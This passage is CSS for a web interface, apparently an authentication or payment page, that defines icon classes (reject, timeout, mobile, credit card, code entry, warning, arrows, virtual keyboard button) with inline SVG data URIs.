            background-image: url("data:image/svg+xml,%3Csvg width='96' height='96' viewBox='0 0 96 96' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M63.5734 89.6008C51.4134 89.6008 41.6001 79.7875 41.6001 67.6275C41.6001 55.4675 51.4134 45.6542 63.5734 45.6542C75.7334 45.6542 85.5468 55.4675 85.5468 67.6275C85.5468 79.7875 75.7334 89.6008 63.5734 89.6008ZM81.6001 67.6275C81.6001 77.5475 73.4934 85.6542 63.5734 85.6542C53.6534 85.6542 45.6534 77.5475 45.6534 67.6275C45.6534 57.7075 53.6534 49.6008 63.5734 49.6008C73.4934 49.6008 81.6001 57.7075 81.6001 67.6275ZM72.1068 73.2808C72.8534 74.0275 72.8534 75.3075 72.1068 76.1608C71.3601 76.9075 70.0801 76.9075 69.2268 76.1608L63.5734 70.4008L57.9201 76.0542C57.1734 76.8008 55.8934 76.8008 55.0401 76.0542C54.2934 75.3075 54.2934 74.0275 55.0401 73.1742L60.6934 67.5208L55.0401 61.8675C54.2934 61.1208 54.2934 59.8408 55.0401 58.9875C55.7868 58.2408 57.0668 58.2408 57.9201 58.9875L63.5734 64.6408L69.2268 58.9875C69.9734 58.2408 71.2534 58.2408 72.1068 58.9875C72.8534 59.7342 72.8534 61.0142 72.1068 61.8675L66.4534 67.5208L72.1068 73.2808Z' fill='%23E72222'/%3E%3Ccircle cx='35.8929' cy='22.3929' r='13.3929' stroke='%23A3B5C9' stroke-width='4'/%3E%3Cpath d='M10 59.0003C16.4978 52.3777 25.4474 48.286 35.3281 48.286C38.1391 48.286 40.8747 48.6172 43.5 49.2436' stroke='%23A3B5C9' stroke-width='4' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E%0A");
            width: 96px;
            height: 96px
        }

        .timeRejectIcon {
            background-image: url("data:image/svg+xml,%3Csvg width='96' height='96' viewBox='0 0 96 96' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M18.1333 5.33334L66.1333 5.33349V17.3867V42.56L62.08 42.3467V9.38668H22.1866V89.5998H18.1333V5.33334Z' fill='%23A3B5C9'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M85.5501 67.6249C85.5501 55.4941 75.7059 45.6499 63.5751 45.6499C51.4443 45.6499 41.6001 55.4941 41.6001 67.6249C41.6001 79.7557 51.4443 89.5999 63.5751 89.5999C75.7059 89.5999 85.5501 79.7557 85.5501 67.6249ZM45.5956 67.6249C45.5956 57.7008 53.6509 49.6454 63.5751 49.6454C73.4992 49.6454 81.5546 57.7008 81.5546 67.6249C81.5546 77.549 73.4992 85.6045 63.5751 85.6045C53.6509 85.6045 45.5956 77.549 45.5956 67.6249Z' fill='%23E72222'/%3E%3Cpath d='M63.5749 55.6904C62.4715 55.6904 61.5771 56.5848 61.5771 57.6882V71.6722H73.5531C74.6565 71.678 75.5554 70.7883 75.5612 69.6849C75.567 68.5816 74.6772 67.6826 73.5739 67.6768L65.5726 67.6352V57.6882C65.5726 56.5848 64.6782 55.6904 63.5749 55.6904Z' fill='%23E72222'/%3E%3C/svg%3E%0A");
            width: 96px;
            height: 96px
        }

        .rejectIcon {
            background-image: url("data:image/svg+xml,%3Csvg width='96' height='96' viewBox='0 0 96 96' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M18.1333 5.33334L66.1333 5.33349V17.3867V42.56L62.08 42.3467V9.38668H22.1866V89.5998H18.1333V5.33334Z' fill='%23A3B5C9'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M63.5734 89.6008C51.4134 89.6008 41.6001 79.7875 41.6001 67.6275C41.6001 55.4675 51.4134 45.6542 63.5734 45.6542C75.7334 45.6542 85.5468 55.4675 85.5468 67.6275C85.5468 79.7875 75.7334 89.6008 63.5734 89.6008ZM81.6001 67.6275C81.6001 77.5475 73.4934 85.6542 63.5734 85.6542C53.6534 85.6542 45.6534 77.5475 45.6534 67.6275C45.6534 57.7075 53.6534 49.6008 63.5734 49.6008C73.4934 49.6008 81.6001 57.7075 81.6001 67.6275ZM72.1068 73.2808C72.8534 74.0275 72.8534 75.3075 72.1068 76.1608C71.3601 76.9075 70.0801 76.9075 69.2268 76.1608L63.5734 70.4008L57.9201 76.0542C57.1734 76.8008 55.8934 76.8008 55.0401 76.0542C54.2934 75.3075 54.2934 74.0275 55.0401 73.1742L60.6934 67.5208L55.0401 61.8675C54.2934 61.1208 54.2934 59.8408 55.0401 58.9875C55.7868 58.2408 57.0668 58.2408 57.9201 58.9875L63.5734 64.6408L69.2268 58.9875C69.9734 58.2408 71.2534 58.2408 72.1068 58.9875C72.8534 59.7342 72.8534 61.0142 72.1068 61.8675L66.4534 67.5208L72.1068 73.2808Z' fill='%23E72222'/%3E%3C/svg%3E%0A");
            width: 96px;
            height: 96px
        }

        .gKlicMobileRejectIcon {
            background-image: url("data:image/svg+xml,%3Csvg width='96' height='96' viewBox='0 0 96 96' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M56.1066 5.33334H28.16C22.6133 5.33334 18.1333 9.81334 18.1333 15.36V17.28V69.3333V75.3067C18.1333 80.8533 22.6133 85.3334 28.16 85.3334H43.52C42.4533 84.0533 41.4933 82.7733 40.64 81.28H28.16C24.8533 81.28 22.1866 78.6133 22.1866 75.3067V71.36H37.3333C37.2266 70.4 37.12 69.3333 37.12 68.2667C37.12 67.9467 37.12 67.6267 37.12 67.3067H22.1866V19.3067H62.08V42.3467C62.4 42.3467 62.8266 42.3467 63.1466 42.3467C64.2133 42.3467 65.1733 42.4533 66.1333 42.56V17.3867V15.36C66.1333 9.81334 61.6533 5.33334 56.1066 5.33334ZM22.1866 15.36C22.1866 12.0533 24.8533 9.38668 28.16 9.38668H56.1066C59.4133 9.38668 62.08 12.0533 62.08 15.36H22.1866Z' fill='%23A3B5C9'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M63.5734 89.6008C51.4134 89.6008 41.6001 79.7875 41.6001 67.6275C41.6001 55.4675 51.4134 45.6542 63.5734 45.6542C75.7334 45.6542 85.5468 55.4675 85.5468 67.6275C85.5468 79.7875 75.7334 89.6008 63.5734 89.6008ZM81.6001 67.6275C81.6001 77.5475 73.4934 85.6542 63.5734 85.6542C53.6534 85.6542 45.6534 77.5475 45.6534 67.6275C45.6534 57.7075 53.6534 49.6008 63.5734 49.6008C73.4934 49.6008 81.6001 57.7075 81.6001 67.6275ZM72.1068 73.2808C72.8534 74.0275 72.8534 75.3075 72.1068 76.1608C71.3601 76.9075 70.0801 76.9075 69.2268 76.1608L63.5734 70.4008L57.9201 76.0542C57.1734 76.8008 55.8934 76.8008 55.0401 76.0542C54.2934 75.3075 54.2934 74.0275 55.0401 73.1742L60.6934 67.5208L55.0401 61.8675C54.2934 61.1208 54.2934 59.8408 55.0401 58.9875C55.7868 58.2408 57.0668 58.2408 57.9201 58.9875L63.5734 64.6408L69.2268 58.9875C69.9734 58.2408 71.2534 58.2408 72.1068 58.9875C72.8534 59.7342 72.8534 61.0142 72.1068 61.8675L66.4534 67.5208L72.1068 73.2808Z' fill='%23E72222'/%3E%3Cpath d='M40.9522 43.8443L29.8667 54.9298V55.8938H32.9192L34.0438 54.7691L33.8028 53.8052L35.1684 52.4396L36.1324 52.6806L37.98 50.833L37.739 49.869L39.1046 48.5034L40.0685 48.7444L43.2014 45.6116C42.3178 45.1296 41.5948 44.487 40.9522 43.8443Z' fill='%231A67D2'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M29.8667 52.8412V54.0462L40.4702 43.3623C40.3095 43.1214 40.1489 42.8804 39.9882 42.6394L29.8667 52.8412Z' fill='%231A67D2'/%3E%3Cpath d='M47.5393 29.8667C43.1212 29.8667 39.5063 33.4815 39.5063 37.8996C39.5063 42.3177 43.1212 45.9326 47.5393 45.9326C51.9574 45.9326 55.5723 42.3177 55.5723 37.8996C55.5723 33.4815 51.9574 29.8667 47.5393 29.8667ZM47.5393 43.4424C44.4868 43.4424 41.9966 40.9521 41.9966 37.8996C41.9966 34.8471 44.4868 32.3569 47.5393 32.3569C50.5918 32.3569 53.082 34.8471 53.082 37.8996C53.0017 40.9521 50.5918 43.4424 47.5393 43.4424Z' fill='%231A67D2'/%3E%3C/svg%3E%0A");
            width: 96px;
            height: 96px
        }

        .gKlicMobileIcon {
            background-image: url("data:image/svg+xml,%3Csvg width='96' height='96' viewBox='0 0 96 96' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M62 87.968H34C28.4774 87.968 24 83.4906 24 77.968V71.999V19.999V18C24 12.4774 28.4774 8 34 8H62C67.5226 8 72 12.4774 72 18V19.999V71.999V77.968C72 83.4906 67.5226 87.968 62 87.968ZM68 73.999V77.968C68 81.2814 65.3134 83.968 62 83.968H34C30.6866 83.968 28 81.2814 28 77.968V73.999H68ZM68 17.999H28C28.0005 14.686 30.6869 12 34 12H62C65.3131 12 67.9995 14.686 68 17.999ZM28 69.999H68V21.999H28V69.999ZM50.121 81.1202C51.293 79.9482 51.293 78.0482 50.121 76.8762C48.951 75.7062 47.051 75.7062 45.879 76.8762C44.707 78.0482 44.707 79.9482 45.879 81.1202C47.051 82.2922 48.951 82.2922 50.121 81.1202Z' fill='%23A3B5C9'/%3E%3Cpath d='M46.2857 47.0443L35.2002 58.1298V59.0937H38.2527L39.3773 57.9691L39.1363 57.0052L40.5019 55.6396L41.4659 55.8806L43.3135 54.033L43.0725 53.069L44.4381 51.7034L45.402 51.9444L48.5349 48.8116C47.6513 48.3296 46.9283 47.6869 46.2857 47.0443Z' fill='%231A67D2'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M35.2002 56.0412V57.2462L45.8037 46.5623C45.643 46.3213 45.4824 46.0803 45.3217 45.8394L35.2002 56.0412Z' fill='%231A67D2'/%3E%3Cpath d='M52.8728 33.0667C48.4547 33.0667 44.8398 36.6815 44.8398 41.0996C44.8398 45.5177 48.4547 49.1326 52.8728 49.1326C57.2909 49.1326 60.9058 45.5177 60.9058 41.0996C60.9058 36.6815 57.2909 33.0667 52.8728 33.0667ZM52.8728 46.6423C49.8203 46.6423 47.3301 44.1521 47.3301 41.0996C47.3301 38.0471 49.8203 35.5569 52.8728 35.5569C55.9253 35.5569 58.4155 38.0471 58.4155 41.0996C58.3352 44.1521 55.9253 46.6423 52.8728 46.6423Z' fill='%231A67D2'/%3E%3C/svg%3E%0A");
            width: 96px;
            height: 96px
        }

        .extensionAdIcon {
            background-image: url("data:image/svg+xml,%3Csvg width='96' height='96' viewBox='0 0 96 96' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M68.0455 22.4659C68.0455 15.0502 61.9953 9 54.5795 9C47.1638 9 41.1136 15.0502 41.1136 22.4659C41.1136 24.0553 41.4729 25.539 41.9833 26.9545H24.9545C24.4784 26.9546 24.0217 27.1437 23.685 27.4804C23.3483 27.8172 23.1591 28.2738 23.1591 28.75V44.2919C22.2924 44.1159 21.382 44.0114 20.4659 44.0114C13.0502 44.0114 7 50.0615 7 57.4773C7 64.893 13.0502 70.9432 20.4659 70.9432C21.382 70.9432 22.2924 70.8387 23.1591 70.6626V86.2045C23.1591 86.6807 23.3483 87.1374 23.685 87.4741C24.0217 87.8108 24.4784 88 24.9545 88H48.5L45.6838 84.4091H26.75V68.25C26.7504 67.9532 26.6772 67.6611 26.5369 67.3995C26.3967 67.138 26.1939 66.9152 25.9465 66.7512C25.6992 66.5873 25.4151 66.4872 25.1196 66.4599C24.8241 66.4326 24.5264 66.4789 24.2532 66.5948C23.0839 67.082 21.8123 67.3523 20.4659 67.3523C14.9908 67.3523 10.5909 62.9523 10.5909 57.4773C10.5909 52.0022 14.9908 47.6023 20.4659 47.6023C21.8123 47.6023 23.0839 47.8726 24.2532 48.3597C24.5264 48.4756 24.824 48.5219 25.1195 48.4946C25.415 48.4673 25.6992 48.3673 25.9465 48.2033C26.1938 48.0393 26.3967 47.8166 26.5369 47.555C26.6771 47.2935 26.7503 47.0013 26.75 46.7045V30.5455H44.7607C45.0852 30.5475 45.4042 30.4616 45.6838 30.2968C45.9634 30.132 46.1931 29.8946 46.3485 29.6097C46.5039 29.3248 46.5791 29.0031 46.5663 28.6788C46.5535 28.3546 46.453 28.0398 46.2756 27.7681C45.2871 26.2256 44.7045 24.4254 44.7045 22.4659C44.7045 16.9908 49.1045 12.5909 54.5795 12.5909C60.0546 12.5909 64.4545 16.9908 64.4545 22.4659C64.4545 24.4254 63.872 26.2256 62.8835 27.7681C62.7061 28.0398 62.6056 28.3546 62.5928 28.6788C62.5799 29.0031 62.6552 29.3248 62.8106 29.6097C62.966 29.8946 63.1957 30.132 63.4753 30.2968C63.7549 30.4616 64.0739 30.5475 64.3984 30.5455H82.4091V44.2919C81.5424 44.1159 80.632 44.0114 79.7159 44.0114C77.9287 44.0114 76.2208 44.3628 74.6578 45L78.5 47.6755C78.8983 47.6272 79.304 47.6023 79.7159 47.6023C81.0623 47.6023 82.3339 47.8726 83.5032 48.3597C83.7764 48.4756 84.074 48.5219 84.3695 48.4946C84.665 48.4673 84.9492 48.3673 85.1965 48.2033C85.4438 48.0393 85.6467 47.8166 85.7869 47.555C85.9271 47.2935 86.0003 47.0013 86 46.7045V28.75C86 28.2738 85.8108 27.8172 85.4741 27.4804C85.1374 27.1437 84.6807 26.9546 84.2045 26.9545H67.1758C67.6862 25.539 68.0455 24.0553 68.0455 22.4659Z' fill='%23A3B5C9'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M86.5468 67.6275C86.5468 79.7875 76.7334 89.6008 64.5734 89.6008C52.4134 89.6008 42.6001 79.7875 42.6001 67.6275C42.6001 55.4675 52.4134 45.6542 64.5734 45.6542C76.7334 45.6542 86.5468 55.4675 86.5468 67.6275ZM64.5734 49.6008C74.4934 49.6008 82.6001 57.7075 82.6001 67.6275C82.6001 77.5475 74.4934 85.5475 64.5734 85.5475C54.6534 85.5475 46.5468 77.5475 46.5468 67.6275C46.5468 57.7075 54.6534 49.6008 64.5734 49.6008Z' fill='%23199CF9'/%3E%3Cpath d='M77.0033 67.9353C76.9279 66.8039 76.0228 65.8988 74.9668 65.8988L66.8964 65.8234L66.8964 57.8284C66.821 56.697 65.9159 55.7919 64.8599 55.7919C63.7285 55.8673 62.8234 56.7724 62.8234 57.8284L62.8235 65.8234L54.8284 65.8234C53.6971 65.8988 52.792 66.8039 52.792 67.8599C52.8674 68.9912 53.7725 69.8963 54.8284 69.8963L62.8234 69.8963L62.8234 77.8914C62.8989 79.0227 63.804 79.9278 64.8599 79.9278C65.9913 79.8524 66.8964 78.9473 66.8964 77.8914L66.8964 69.8963L74.9668 69.9718C76.0982 69.8963 77.0033 68.9912 77.0033 67.9353Z' fill='%23199CF9'/%3E%3C/svg%3E");
            width: 96px;
            height: 96px
        }

        .creditcardIcon {
            background-image: url("data:image/svg+xml,%3Csvg width='96' height='96' viewBox='0 0 96 96' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M11.4601 78.1596H84.5399C88.1737 78.1596 91 75.3333 91 71.6995V24.4601C91 20.8263 88.1737 18 84.5399 18H11.4601C7.82629 18 5 20.8263 5 24.4601V71.6995C5 75.3333 7.82629 78.1596 11.4601 78.1596ZM86.7606 71.6995C86.7606 72.9108 85.7512 73.9202 84.5399 73.9202H11.4601C10.2488 73.9202 9.23944 72.9108 9.23944 71.6995V24.4601C9.23944 23.2488 10.2488 22.2394 11.4601 22.2394H84.5399C85.7512 22.2394 86.7606 23.2488 86.7606 24.4601V71.6995ZM19.939 61C18.7277 61 17.9202 59.9906 17.9202 58.7793C17.9202 57.5681 18.7277 56.7606 19.939 56.7606H24.3803C25.5915 56.7606 26.3991 57.5681 26.3991 58.7793C26.3991 59.9906 25.5915 61 24.3803 61H19.939ZM35.0798 58.7793C35.0798 59.9906 36.0892 61 37.3005 61H41.5399C42.7512 61 43.7606 59.9906 43.7606 58.7793C43.7606 57.5681 42.7512 56.7606 41.5399 56.7606H37.3005C36.0892 56.7606 35.0798 57.5681 35.0798 58.7793ZM54.4601 61C53.2488 61 52.2394 59.9906 52.2394 58.7793C52.2394 57.5681 53.2488 56.7606 54.4601 56.7606H58.6995C59.9108 56.7606 60.9202 57.5681 60.9202 58.7793C60.9202 59.9906 59.9108 61 58.6995 61H54.4601ZM69.6009 58.7793C69.6009 59.9906 70.4084 61 71.6197 61H76.061C77.2723 61 78.0798 59.9906 78.0798 58.7793C78.0798 57.5681 77.2723 56.7606 76.061 56.7606H71.6197C70.4084 56.7606 69.6009 57.5681 69.6009 58.7793Z' fill='%23A3B5C9'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M26.3993 35.1596H22.1598C19.7373 35.1596 17.9204 37.1784 17.9204 39.3991V43.8404C17.9204 46.061 19.7373 48.0798 22.1598 48.0798H26.3993C28.8218 48.0798 30.8406 46.061 30.8406 43.8404V39.3991C30.8406 37.1784 28.8218 35.1596 26.3993 35.1596ZM22.1597 43.8404V39.3991H26.3991V43.8404H22.1597Z' fill='%23199CF9'/%3E%3C/svg%3E%0A");
            width: 96px;
            height: 96px
        }

        .codeMobileIcon {
            background-image: url("data:image/svg+xml,%3Csvg width='96' height='96' viewBox='0 0 96 96' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M34 24V20H16C16 16.6863 18.6863 14 22 14H34C34 12.5975 34.2406 11.2511 34.6828 10H22C16.4772 10 12 14.4772 12 20V22V74V80C12 85.5229 16.4772 90 22 90H50C55.5228 90 60 85.5229 60 80V74V42H56V72H16V24H34ZM16 76H56V80C56 83.3137 53.3137 86 50 86H22C18.6863 86 16 83.3137 16 80V76ZM38.1205 78.8775C39.292 80.049 39.292 81.9494 38.1205 83.1209C36.9505 84.2924 35.0501 84.2924 33.8786 83.1209C32.7071 81.9494 32.7071 80.049 33.8786 78.8775C35.0501 77.7075 36.9505 77.7075 38.1205 78.8775Z' fill='%23A3B5C9'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M41.5364 47.7563L49.6667 38H78C82.4183 38 86 34.4183 86 30V14C86 9.58172 82.4183 6 78 6H46C41.5817 6 38 9.58172 38 14V46.4759C38 47.0695 38.2636 47.6324 38.7196 48.0123C39.5682 48.7195 40.8293 48.6048 41.5364 47.7563ZM78 34H47.7932L42 40.9518V14C42 11.7909 43.7909 10 46 10H78C80.2091 10 82 11.7909 82 14V30C82 32.2091 80.2091 34 78 34Z' fill='%231A67D2'/%3E%3Cpath d='M49.488 25.5983C49.198 25.3843 49.048 25.1343 49.04 24.8483C49.032 24.5663 49.16 24.2843 49.416 24.0003L50.498 22.8023L48.91 22.4543C48.558 22.3703 48.3 22.2163 48.142 21.9883C47.982 21.7663 47.956 21.4723 48.07 21.1043L48.166 20.7803C48.278 20.4283 48.46 20.2103 48.718 20.1183C48.972 20.0263 49.264 20.0623 49.584 20.2283L51.074 20.9283L50.88 19.2303C50.834 18.8663 50.894 18.5683 51.062 18.3443C51.23 18.1203 51.49 18.0083 51.844 18.0083H52.156C52.508 18.0083 52.764 18.1203 52.924 18.3443C53.086 18.5683 53.15 18.8663 53.116 19.2303L52.924 20.9563L54.416 20.2283C54.752 20.0623 55.042 20.0263 55.29 20.1183C55.538 20.2103 55.718 20.4283 55.834 20.7803L55.93 21.1043C56.04 21.4723 56.022 21.7663 55.868 21.9883C55.714 22.2163 55.462 22.3703 55.112 22.4543L53.502 22.8023L54.584 24.0003C54.84 24.2843 54.966 24.5663 54.966 24.8483C54.966 25.1343 54.814 25.3843 54.512 25.5983L54.27 25.7743C53.964 25.9903 53.686 26.0563 53.43 25.9723C53.174 25.8903 52.954 25.6903 52.78 25.3763L51.988 23.9743L51.242 25.3763C51.048 25.6903 50.826 25.8903 50.57 25.9723C50.312 26.0563 50.038 25.9903 49.752 25.7743L49.488 25.5983Z' fill='%231A67D2'/%3E%3Cpath d='M59.488 25.5983C59.198 25.3843 59.048 25.1343 59.04 24.8483C59.032 24.5663 59.16 24.2843 59.416 24.0003L60.498 22.8023L58.91 22.4543C58.558 22.3703 58.3 22.2163 58.142 21.9883C57.982 21.7663 57.956 21.4723 58.07 21.1043L58.166 20.7803C58.278 20.4283 58.46 20.2103 58.718 20.1183C58.972 20.0263 59.264 20.0623 59.584 20.2283L61.074 20.9283L60.88 19.2303C60.834 18.8663 60.894 18.5683 61.062 18.3443C61.23 18.1203 61.49 18.0083 61.844 18.0083H62.156C62.508 18.0083 62.764 18.1203 62.924 18.3443C63.086 18.5683 63.15 18.8663 63.116 19.2303L62.924 20.9563L64.416 20.2283C64.752 20.0623 65.042 20.0263 65.29 20.1183C65.538 20.2103 65.718 20.4283 65.834 20.7803L65.93 21.1043C66.04 21.4723 66.022 21.7663 65.868 21.9883C65.714 22.2163 65.462 22.3703 65.112 22.4543L63.502 22.8023L64.584 24.0003C64.84 24.2843 64.966 24.5663 64.966 24.8483C64.966 25.1343 64.814 25.3843 64.512 25.5983L64.27 25.7743C63.964 25.9903 63.686 26.0563 63.43 25.9723C63.174 25.8903 62.954 25.6903 62.78 25.3763L61.988 23.9743L61.242 25.3763C61.048 25.6903 60.826 25.8903 60.57 25.9723C60.312 26.0563 60.038 25.9903 59.752 25.7743L59.488 25.5983Z' fill='%231A67D2'/%3E%3Cpath d='M69.488 25.59C69.198 25.376 69.048 25.126 69.04 24.84C69.032 24.556 69.16 24.276 69.416 23.992L70.498 22.794L68.91 22.444C68.558 22.362 68.3 22.208 68.142 21.98C67.982 21.758 67.956 21.464 68.07 21.096L68.166 20.772C68.278 20.42 68.46 20.202 68.718 20.11C68.972 20.018 69.264 20.054 69.584 20.22L71.074 20.92L70.88 19.222C70.834 18.858 70.894 18.56 71.062 18.336C71.23 18.112 71.49 18 71.844 18H72.156C72.508 18 72.764 18.112 72.924 18.336C73.086 18.56 73.15 18.858 73.116 19.222L72.924 20.948L74.416 20.22C74.752 20.054 75.042 20.018 75.29 20.11C75.538 20.202 75.718 20.42 75.834 20.772L75.93 21.096C76.04 21.464 76.022 21.758 75.868 21.98C75.714 22.208 75.462 22.362 75.112 22.444L73.502 22.794L74.584 23.992C74.84 24.276 74.966 24.556 74.966 24.84C74.966 25.126 74.814 25.376 74.512 25.59L74.27 25.766C73.964 25.982 73.686 26.048 73.43 25.964C73.174 25.882 72.954 25.682 72.78 25.368L71.988 23.966L71.242 25.368C71.048 25.682 70.826 25.882 70.57 25.964C70.312 26.048 70.038 25.982 69.752 25.766L69.488 25.59Z' fill='%231A67D2'/%3E%3C/svg%3E");
            width: 96px;
            height: 96px
        }

        .backIcon {
            background-image: url("data:image/svg+xml,%3Csvg width='96' height='96' viewBox='0 0 96 96' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Crect x='-0.5' y='0.5' width='95' height='95' transform='matrix(-1 0 0 1 95 0)' stroke='black' stroke-opacity='0.01'/%3E%3Cpath d='M77.8667 5.33333L29.8667 5.33348V17.3867V42.56L33.92 42.3467V9.38666H73.8134V89.5998H77.8667V5.33333Z' fill='%23A3B5C9'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M32.4266 89.6008C44.5866 89.6008 54.3999 79.7875 54.3999 67.6275C54.3999 55.4675 44.5866 45.6542 32.4266 45.6542C20.2666 45.6542 10.4532 55.4675 10.4532 67.6275C10.4532 79.7875 20.2666 89.6008 32.4266 89.6008ZM14.3999 67.6275C14.3999 77.5475 22.5066 85.6542 32.4266 85.6542C42.3466 85.6542 50.3466 77.5475 50.3466 67.6275C50.3466 57.7075 42.3466 49.6008 32.4266 49.6008C22.5066 49.6008 14.3999 57.7075 14.3999 67.6275Z' fill='%23199CF9'/%3E%3Cpath d='M32.1818 57L42 67M42 67L32.1818 77M42 67H22' stroke='%23199CF9' stroke-width='4' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E%0A");
            width: 96px;
            height: 96px
        }

        .userWarningIcon {
            background-image: url("data:image/svg+xml,%3Csvg width='96' height='96' viewBox='0 0 96 96' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Crect x='0.5' y='0.5' width='95' height='95' stroke='black' stroke-opacity='0.01'/%3E%3Ccircle cx='35.8929' cy='22.3929' r='13.3929' stroke='%23A3B5C9' stroke-width='4'/%3E%3Cpath d='M10 59.0003C16.4978 52.3777 25.4474 48.286 35.3281 48.286C38.1391 48.286 40.8747 48.6172 43.5 49.2436' stroke='%23A3B5C9' stroke-width='4' stroke-linecap='round' stroke-linejoin='round'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M42.7815 79.0492C40.4938 83.2096 43.5026 88.3 48.2501 88.3H79.9481C84.6956 88.3 87.7066 83.2096 85.4189 79.0494L69.5698 50.2331C67.1976 45.9224 61.0028 45.9224 58.6307 50.2326L42.7815 79.0492ZM79.9479 84.1385H48.25C46.668 84.1385 45.665 82.4417 46.4278 81.0545L62.2767 52.2385C63.0671 50.8022 65.1329 50.8022 65.9236 52.239L81.7723 81.0547C82.5347 82.4411 81.5306 84.1385 79.9479 84.1385ZM66.1806 69.5734V61.2504C66.1806 60.1012 65.249 59.1697 64.0998 59.1697C62.9507 59.1697 62.0191 60.1012 62.0191 61.2504V69.5734C62.0191 70.7225 62.9507 71.6541 64.0998 71.6541C65.249 71.6541 66.1806 70.7225 66.1806 69.5734ZM62.021 77.8903C62.021 79.0388 62.9532 79.971 64.1018 79.971C65.2503 79.971 66.1825 79.0388 66.1825 77.8903C66.1825 76.7396 65.2503 75.8095 64.1018 75.8095C62.9532 75.8095 62.021 76.7396 62.021 77.8903Z' fill='%23F2A91E'/%3E%3C/svg%3E%0A");
            width: 96px;
            height: 96px
        }

        .arrowDownIcon {
            background-image: url("data:image/svg+xml,%3Csvg width='20' height='20' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M10 11.322l3.577-3.578a.833.833 0 111.179 1.179l-4.167 4.166a.833.833 0 01-1.178 0L5.244 8.923a.833.833 0 111.179-1.179L10 11.322z' fill='%231A67D2'/%3E%3C/svg%3E");
            width: 20px;
            height: 20px
        }

        .arrowDownGreyIcon {
            background-image: url("data:image/svg+xml,%3Csvg width='20' height='20' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M10 11.322l3.577-3.578a.833.833 0 111.179 1.179l-4.167 4.166a.833.833 0 01-1.178 0L5.244 8.923a.833.833 0 111.179-1.179L10 11.322z' fill='%23A3B5C9' fill-opacity='.5'/%3E%3C/svg%3E");
            width: 20px;
            height: 20px
        }

        .arrowUpIcon {
            background-image: url("data:image/svg+xml,%3Csvg width='20' height='20' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M10 8.679l-3.577 3.577a.833.833 0 11-1.179-1.179l4.167-4.166a.833.833 0 011.178 0l4.167 4.166a.833.833 0 11-1.179 1.179L10 8.679z' fill='%231A67D2'/%3E%3C/svg%3E");
            width: 20px;
            height: 20px
        }

        div:not(.recolor) span.vkBtn {
            position: absolute;
            margin: 0;
            margin-top: 18px;
            margin-left: -33px;
            width: 23px;
            height: 23px;
            cursor: pointer;
            background-image: url("data:image/svg+xml,%3Csvg width='23' height='12' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill='%23fff' d='M.897 0h22.07v12H.898z'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M.897 12V0h22.07v12H.898zM17.75 2h-2.007v2h2.007V2zm-2.007 3h2.007v2h-2.007V5zm-1.203-3h-2.007v2h2.007V2zm-2.007 3h2.007v2h-2.007V5zM11.33 2H9.324v2h2.006V2zM9.324 5h2.006v2H9.324V5zM8.12 2H6.114v2H8.12V2zM6.114 5H8.12v2H6.114V5zm-3.21 2H4.91V5H2.903v2zM4.91 4H2.903V2H4.91v2zm.2 6.3h13.845v-2H5.11v2zM20.961 7h-2.006V5h2.006v2zm-2.006-3h2.006V2h-2.006v2z' fill='%235C7999'/%3E%3C/svg%3E");
            background-repeat: no-repeat
        }

        div.recolor span.vkBtn,
        .input.error ~ span.vkBtn {
            position: absolute;
            margin: 0;
            margin-top: 18px;
            margin-left: -33px;
            width: 23px;
            height: 23px;
            cursor: pointer;
            background-image: url("data:image/svg+xml,%3Csvg width='23' height='12' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill='%23fff' d='M.897 0h22.071v12H.897z'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M.897 12V0h22.071v12H.897zM17.751 2h-2.006v2h2.006V2zm-2.006 3h2.006v2h-2.006V5zM14.54 2h-2.007v2h2.007V2zm-2.007 3h2.007v2h-2.007V5zM11.33 2H9.325v2h2.007V2zM9.325 5h2.007v2H9.324V5zM8.12 2H6.114v2H8.12V2zM6.114 5H8.12v2H6.114V5zm-3.21 2H4.91V5H2.903v2zM4.91 4H2.903V2H4.91v2zm.2 6.3h13.845v-2H5.111v2zM20.962 7h-2.006V5h2.007v2zm-2.006-3h2.007V2h-2.007v2z' fill='%23E72222'/%3E%3C/svg%3E");
            background-repeat: no-repeat
        }

        div span.vkBtn,
        .input[disabled] ~ span.vkBtn {
            position: absolute;
            margin: 0;
            margin-top: 18px;
            margin-left: -33px;
            width: 23px;
            height: 23px;
            cursor: pointer;
